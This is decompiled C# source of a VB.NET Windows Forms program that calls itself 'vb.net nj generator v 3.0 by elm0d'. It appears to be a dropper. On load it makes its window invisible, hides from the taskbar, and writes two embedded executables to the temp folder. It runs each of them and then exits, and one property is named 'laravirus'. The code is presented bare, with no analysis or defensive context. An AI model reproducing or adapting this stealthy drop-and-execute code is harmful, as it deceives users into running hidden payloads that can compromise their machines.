using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using vb.net_nj_generator_v_3._0_by_elm0d.My;
using vb.net_nj_generator_v_3._0_by_elm0d.My.Resources;

namespace vb.net_nj_generator_v_3._0_by_elm0d;

[DesignerGenerated]
public class Form1 : Form
{
	private static List<WeakReference> __ENCList = new List<WeakReference>();

	private IContainer components;

	private int laravirus
	{
		[DebuggerNonUserCode]
		get;
		[DebuggerNonUserCode]
		set;
	}

	[DebuggerNonUserCode]
	public Form1()
	{
		((Form)this).add_Load((EventHandler)Form1_Load);
		__ENCAddToList(this);
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	private static void __ENCAddToList(object value)
	{
		checked
		{
			lock (__ENCList)
			{
				if (__ENCList.Count == __ENCList.Capacity)
				{
					int num = 0;
					int num2 = __ENCList.Count - 1;
					int num3 = 0;
					while (true)
					{
						int num4 = num3;
						int num5 = num2;
						if (num4 > num5)
						{
							break;
						}
						WeakReference weakReference = __ENCList[num3];
						if (weakReference.IsAlive)
						{
							if (num3 != num)
							{
								__ENCList[num] = __ENCList[num3];
							}
							num++;
						}
						num3++;
					}
					__ENCList.RemoveRange(num, __ENCList.Count - num);
					__ENCList.Capacity = __ENCList.Count;
				}
				__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
			}
		}
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if ((disposing && components != null) ? true : false)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		components = new Container();
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_Text("Form1");
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	private void Form1_Load(object sender, EventArgs e)
	{
		int try0001_dispatch = -1;
		int num = default(int);
		int num2 = default(int);
		int num3 = default(int);
		string text = default(string);
		string temp = default(string);
		string temp2 = default(string);
		string text2 = default(string);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0001_dispatch)
				{
				default:
					num = 1;
					((Form)this).set_Opacity(0.0);
					goto IL_0013;
				case 310:
					{
						num2 = num;
						if (num3 > -2)
						{
							switch (num3)
							{
							case 1:
								break;
							default:
								goto end_IL_0001;
							}
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0013;
						case 3:
							goto IL_001c;
						case 4:
							goto IL_0026;
						case 5:
							goto IL_0030;
						case 6:
							goto IL_0039;
						case 7:
							goto IL_0047;
						case 8:
							goto IL_005f;
						case 9:
							goto IL_006e;
						case 10:
							goto IL_007d;
						case 11:
							goto IL_0088;
						case 12:
							goto IL_0097;
						case 13:
							goto IL_00b0;
						case 14:
							goto IL_00c0;
						case 15:
							goto end_IL_0001_2;
						default:
							goto end_IL_0001;
						case 16:
							goto end_IL_0001_3;
						}
						goto default;
					}
					IL_00c0:
					num = 14;
					File.WriteAllBytes(text, Resources.vb_net_nj_generator_v_3_0_by_elm0d1);
					break;
					IL_00b0:
					num = 13;
					text = temp + "vb.net nj generator v 3.0 by elm0d1.exe";
					goto IL_00c0;
					IL_0013:
					num = 2;
					((Control)this).Hide();
					goto IL_001c;
					IL_001c:
					num = 3;
					((Form)this).set_ShowInTaskbar(false);
					goto IL_0026;
					IL_0026:
					num = 4;
					((Form)this).set_ShowIcon(false);
					goto IL_0030;
					IL_0030:
					ProjectData.ClearProjectError();
					num3 = -2;
					goto IL_0039;
					IL_0039:
					num = 6;
					laravirus = 1000;
					goto IL_0047;
					IL_0047:
					num = 7;
					temp2 = ((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_Temp();
					goto IL_005f;
					IL_005f:
					num = 8;
					text2 = temp2 + "vb.net nj generator v 3.0 by elm0d.exe";
					goto IL_006e;
					IL_006e:
					num = 9;
					File.WriteAllBytes(text2, Resources.vb_net_nj_generator_v_3_0_by_elm0d);
					goto IL_007d;
					IL_007d:
					num = 10;
					Process.Start(text2);
					goto IL_0088;
					IL_0088:
					num = 11;
					laravirus = 1000;
					goto IL_0097;
					IL_0097:
					num = 12;
					temp = ((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_Temp();
					goto IL_00b0;
					end_IL_0001_2:
					break;
				}
				num = 15;
				Process.Start(text);
				ProjectData.EndApp();
				break;
				end_IL_0001:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0001_dispatch = 310;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0001_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}
}
